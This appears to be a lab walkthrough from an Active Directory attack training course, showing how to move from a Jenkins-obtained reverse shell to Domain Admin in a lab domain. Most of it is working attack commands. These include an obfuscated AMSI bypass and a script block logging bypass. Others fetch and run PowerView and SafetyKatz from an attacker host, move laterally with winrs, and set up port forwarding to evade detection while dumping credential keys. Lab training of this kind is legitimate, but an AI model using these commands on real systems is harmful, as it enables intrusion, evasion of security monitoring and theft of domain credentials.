# LO 7

Identify a machine in the target domain where a Domain Admin session is available.

Compromise the machine and escalate privileges to Domain Admin

* Using access to dcorp-ci
* Using derivative local admin

We got a reverse shell on dcorp-ci as ciadmin by abusing Jenkins.

First bypass Enhanced Script Block Logging so that the AMSI bypass is not logged.&#x20;

The below command bypasses Enhanced Script Block Logging:

<pre class="language-powershell"><code class="lang-powershell">c:\AD\Tools\hfs.exe C:\AD\Tools\sbloggingbypass.txt
<strong>iex (iwr http://172.16.100.x/sbloggingbypass.txt -UseBasicParsing)
</strong></code></pre>

Use the below command to bypass AMSI:

```powershell
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```

Now, download and execute **PowerView** in memory of the reverse shell and run **FindDomainUserLocation**. Note that, Find-DomainUserLocation may take many minutes to check all the machines in the domain:

```powershell
c:\AD\Tools\hfs.exe C:\AD\Tools\PowerView.ps1
iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.X/PowerView.ps1'))
Find-DomainUserLocation

<# Output example:
UserDomain : dcorp
UserName : svcadmin
ComputerName : dcorp-mgmt.dollarcorp.moneycorp.local
IPAddress : 172.16.4.44
SessionFrom :
SessionFromName :
LocalAdmin :
[snip]#>
```

There is a domain admin session on dcorp-mgmt server.

Check if we can execute commands on dcorp-mgmt server and if the **winrm** port is open:

<pre><code><strong>winrs -r:dcorp-mgmt set computername;set username
</strong></code></pre>

We would now run **SafetyKatz.exe** on dcorp-mgmt to extract credentials from it. For that, we need to copy Loader.exe on dcorp-mgmt. Let's download **Loader.exe** on dcorp-ci and copy it from there to dcorp-mgmt. This is to avoid any downloading activity on dcorp-mgmt.

Run the following command on the reverse shell:

```
c:\AD\Tools\hfs.exe C:\ad\Tools\Loader.exe
iwr http://172.16.100.x/Loader.exe -OutFile C:\Users\Public\Loader.exe
```

Now, copy the Loader.exe to dcorp-mgmt:

```
echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
```

Using winrs, add the following port forwarding on dcorp-mgmt to avoid detection on dcorp-mgmt:

```
$null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.x"
```

Load and execute SafetyKatz on dcorp-mgmt:

```
$null | winrs -r:dcorp-mgmtC:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::ekeys exit
```

